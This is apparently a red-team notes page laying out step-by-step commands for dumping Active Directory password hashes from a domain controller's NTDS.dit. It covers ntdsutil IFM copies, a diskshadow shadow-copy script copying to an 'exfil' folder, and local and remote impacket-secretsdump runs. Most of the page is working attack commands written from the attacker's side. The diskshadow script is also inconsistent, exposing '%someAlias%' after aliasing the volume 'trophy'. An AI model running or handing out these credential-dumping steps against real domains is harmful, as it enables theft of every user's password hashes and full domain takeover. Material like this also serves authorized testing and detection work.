---
description: Dumping NTDS.dit with Active Directory users hashes
tags: [#active-directory]
---

# Dumping Domain Controller Hashes Locally and Remotely

## No Credentials - ntdsutil

If you have no credentials, but you have access to the DC, it's possible to dump the ntds.dit using a lolbin ntdsutil.exe:



```bash
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```



We can see that the ntds.dit and SYSTEM as well as SECURITY registry hives are being dumped to c:\temp:

![[ntdsutil-attacker.png]]

We can then dump password hashes offline with impacket:



```bash
root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
```



![[ntds-hashdump (1).png]]

## No Credentials - diskshadow

On Windows Server 2008+, we can use diskshadow to grab the ntdis.dit.

Create a shadowdisk.exe script instructing to create a new shadow disk copy of the disk C (where ntds.dit is located in our case) and expose it as drive Z:\\

```erlang
// shadow.txt
set context persistent nowriters
set metadata c:\exfil\metadata.cab
add volume c: alias trophy
create
expose %someAlias% z:
```

...and now execute the following:

```erlang
mkdir c:\exfil
diskshadow.exe /s C:\users\Administrator\Desktop\shadow.txt
cmd.exe /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
```

Below shows the ntds.dit got etracted and placed into our c:\exfil folder:

![[image (406).png]]

Inside interactive diskshadow utility, clean up the shadow volume:

```
diskshadow.exe
    > delete shadows volume trophy
    > reset
```

## With Credentials

If you have credentials for an account that can log on to the DC, it's possible to dump hashes from NTDS.dit remotely via RPC protocol with impacket:

```
impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6
```

![[image (223).png]]

## References

[adsecurity.org/?p=2362](https://adsecurity.org/?p=2362)

[www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM)](https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM)/)

[bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
